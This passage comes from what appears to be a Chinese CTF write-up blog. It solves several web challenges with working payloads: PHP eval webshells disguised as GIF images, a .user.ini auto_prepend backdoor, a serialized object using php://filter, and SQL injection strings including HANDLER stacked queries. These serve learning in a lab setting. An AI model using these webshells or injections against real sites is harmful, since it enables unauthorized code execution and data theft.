src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 去掉重复的即为最终的flag答案。</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="一、本题做题思路-20"><a href="#一、本题做题思路-20" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810758.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;    $id&#x3D;$_GET[&#39;id&#39;];    $gg&#x3D;$_GET[&#39;gg&#39;];    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;&#x2F;&#x2F;md5强等于绕过        echo &#39;You got the first step&#39;;        if(isset($_POST[&#39;passwd&#39;])) &#123;            $passwd&#x3D;$_POST[&#39;passwd&#39;];            if (!is_numeric($passwd))&#x2F;&#x2F;$passwd不能是数字            &#123;                 if($passwd&#x3D;&#x3D;1234567)&#x2F;&#x2F;弱等于为1234567                 &#123;                     echo &#39;Good Job!&#39;;                     highlight_file(&#39;flag.php&#39;);                     die(&#39;By Retr_0&#39;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#39;You can not get it !&#39;;            &#125;        &#125;        else&#123;            die(&#39;only one way to get the flag&#39;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#39;Please input first&#39;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先走第一步，MD5强等于绕过，即数组绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810784.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再说明POST传参$passwd不是数字且弱等于1234567。所以我们可以在1234567后加一个英文字母。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810839.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="一、本题做题思路-21"><a href="#一、本题做题思路-21" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811560.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道上传题，先试试PHP。回显非法后缀，看来又是要靠图片来绕过了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811555.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">上传图片后发现，此题还对文件内容有所要求</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811515.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以我们上传图片文件里不能用平常的一句话木马，要换为如下的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再次尝试一下。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811541.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 出现新的回显，说这不是图片。所以又需要用到我们的图片幻术头</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811572.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 这不就跟我们上面一道题长的一样了么。所以构造payload,不过我们需要对图片内容修改一下，将其POST传入改为GET传入，要记得上传一个.user.ini文件，文件内容在下面写了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a?&lt;script language&#x3D;&#39;php&#39;&gt;eval($_GET[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811544.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;print_r(&quot;&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后通过cat来抓取flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811006.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">或者通过蚁剑抓包</p><p>先传一个.user.ini文件，文件内容如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89aauto_prepend_file&#x3D;xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后再传入这个xiaoma.jpg</p><p>最后在蚁剑上连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811075.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> url+上传路径+index.php即可得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-11"><a href="#二、本题知识点-11" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>.user.ini留后门  <strong>使.user.ini指定文件，在其当前目录下的文件执行时会将你指定的文件中的代码执行出来，以此带入后门。</strong></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="一、本题做题思路-22"><a href="#一、本题做题思路-22" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题是一道代码审计题，代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;&#x2F;&#x2F;判断op是弱等于字符串1还是弱等于字符串2            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);&#x2F;&#x2F;如果弱等于字符串2，就转向read()和output()函数        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);&#x2F;&#x2F;读取文件路径        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;&#x2F;&#x2F;得出结果        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)&#x2F;&#x2F;如果op强等于字符串2，则将op等于字符串1，然后执行process()。            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#x2F;&#x2F;GET传参str，如果没有不可打印的字符，对该字符串进行反序列化&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>is_valid()函数</strong>对传入的$s进行检测，如果它的ASCII码值在32-25之间，才会返回true。即确定$s的字符都是能被打印的。</p><p>经过上面代码审计，得知如果需要得到结果，在**__destruct()函数<strong>里要开始准备对op所传的参来绕过</strong>process()**方法，防止op被置于字符串1 可以传入$op&#x3D;2，所以通过在线php运行工具构造payload。因为这道题用的是protected，而protected会导致最后得到的序列化结果有些符号打印不出来，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814610.png">所以我们可以改成public,</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814669.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php class FileHandler&#123;    public $op &#x3D; 2;    public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;     public $content;    &#125;    $a &#x3D; new FileHandler();        $b&#x3D;serialize($a);        echo($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到结果</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> base64解码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814585.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-12"><a href="#二、本题知识点-12" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>**file_get_content()**可以读取php:&#x2F;&#x2F;filter伪协议。</p><p><strong>is_valid()函数</strong>对传入参进行检测</p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="一、本题做题思路-23"><a href="#一、本题做题思路-23" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开源码有线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开发现源码有提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">经过base32 - base64 解密得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">select * from user where username &#x3D; &#39;$name&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合本题是SQL注入题，Fuzz测试一下</p><p>发现or，order等都被过滤了，但是Order(没被过滤)可以绕过order。</p><p>根据’和”回显判断本题是由’回显（上面是’闭合，下面是”闭合）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815411.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据Order绕过判断列数可知本题有三个字段数，上面是判断三个，下面是判断4个</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815422.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815874.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题的考点在于是否得知  当我们进行联合查询时，如果联合查询查询的数据不存在，联合查询会虚构一个数据。</p><p>所以我们可以跟这样写</p><p>在UserName中写  <strong>1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#</strong></p><p>在password中写 <strong>1</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> c4ca4238a0b923820dcc509a6f75849b是1的MD5 32位小写加密</p><p>最后得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815036.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-13"><a href="#二、本题知识点-13" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p><strong>联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><h3 id="一、本题做题思路-24"><a href="#一、本题做题思路-24" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>当我们直接上传.php文件时，会出现错误回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以跟往常题一样，通过图片绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现其对文件内容也有要求 </p><p>所以换种php输入方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">想着再通过.htaccess文件使蚁剑可以连接，发现对其也有限制</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过没事，这个原因可以通过BP抓包，然后将Content-Type 修改为image&#x2F;jpg就行</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817469.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">蚁剑连接在主目录得到答案</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041817556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><h2 id="一、本题做题思路-25"><a href="#一、本题做题思路-25" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818019.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">跟随便注那道题很像，所以我们先看看过滤了啥</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818016.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 只能尝试堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818976.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题为’闭合</p><p>所以尝试堆叠注入查查库</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show tables-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818022.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到线索了，直接查看Flaghere这个表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;FlagHere&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 再看看words表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;show columns from &#96;words&#96;-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818457.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到这里尝试抓取flag也没法实现，也没法像随便注那道题那样解决，看网上大佬博客知道了还有<strong>Handler</strong>方法 </p><p><strong>HANDLER … OPEN语句打开一个表<br> HANDLER … READ语句访问<br> HANDLER … CLOSE关闭一个表</strong></p><p>由此我们可以构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041818447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">  </p><h3 id="二、本题知识点-14"><a href="#二、本题知识点-14" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>MySQL 中除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。</strong></p><p>**<code>HANDLER ... OPEN</code><strong>语句会打开一个表，使其能够用后续的</strong><code>HANDLER ... READ</code><strong>语句访问。这个表不能和其他会话共享直到</strong><code>HANDLER ... CLOSE</code>**或会话关闭。</p><p>详情可看<a href="https://www.jianshu.com/p/81fad5351736">大佬博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网安、新手、WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow限免vip题目WP</title>
      <link href="/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/"/>
      <url>/2023/04/21/ctfshow%E9%99%90%E5%85%8Dvip%E9%A2%98%E7%9B%AEWP/</url>
      
        <content type="html"><![CDATA[<p> 学习web时刷题，其题目确实很基础适合我这种新手入手</p><h2 id="一、源码泄露"><a href="#一、源码泄露" class="headerlink" title="一、源码泄露"></a>一、源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819256.png"></p><p>本题就是简单的查看源代码找到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211819910.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="二、前台JS绕过"><a href="#二、前台JS绕过" class="headerlink" title="二、前台JS绕过"></a>二、前台JS绕过</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820126.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 本题打开后显示无法打开源代码，但好像只要手动打开源代码就能看到flag，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211820840.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>或者将本题用BP抓包就可以拿到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211821021.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="三、协议头信息泄露"><a href="#三、协议头信息泄露" class="headerlink" title="三、协议头信息泄露"></a>三、协议头信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211824129.png"></p><p>打开本题也是问flag在哪里，本题要么直接BP抓包然后在重发器发送后头中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211825332.png"></p><p>或者在浏览器的网络里找到Date，下面有着flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826033.png"></p><h2 id="四、robots后台泄露"><a href="#四、robots后台泄露" class="headerlink" title="四、robots后台泄露"></a>四、robots后台泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211826548.png"></p><p>如图本题还是一样的要求，根据题目我们可以知道其跟robots有关，所以在本题网址后输入&#x2F;robots.txt，可以得到如下图的情况：<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827220.png"></p><p>再将robots.txt替换成如图的txt,得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827270.png"></p><h2 id="五、phps源码泄露"><a href="#五、phps源码泄露" class="headerlink" title="五、phps源码泄露"></a>五、phps源码泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827658.png"></p><p>根据本题题目phps源码泄露，想到了index.phps可能与其相关，输入后得到一个phps文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211827676.png"> 打开文件后得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828741.png"></p><h2 id="六、源码压缩包泄露"><a href="#六、源码压缩包泄露" class="headerlink" title="六、源码压缩包泄露"></a>六、源码压缩包泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828880.png"></p><p>本题依旧是需要借题目来得到关于flag的线索</p><p>根据上关源码泄露，以及本题源码压缩包泄露 ,直接访问&#x2F;<a href="http://www.zip.一般网站的文件都在www下,所以直接访问www.zip可以得到所需压缩包,打开后里面有俩个文件/">www.zip。一般网站的文件都在www下，所以直接访问www.zip可以得到所需压缩包，打开后里面有俩个文件</a><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828879.png"></p><p>多半与第一个txt文件有关，直接在网站搜索该文件，即在网站后缀加上&#x2F;fl000g.txt。得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211828829.png"></p><h2 id="七、版本控制泄露源码"><a href="#七、版本控制泄露源码" class="headerlink" title="七、版本控制泄露源码"></a>七、版本控制泄露源码</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211829737.png">依旧是要依靠题目来得到我们所需的flag，本题题目所设计版本控制，上网搜了下版本控制系统，</p><!--版本控制系统（Version Control 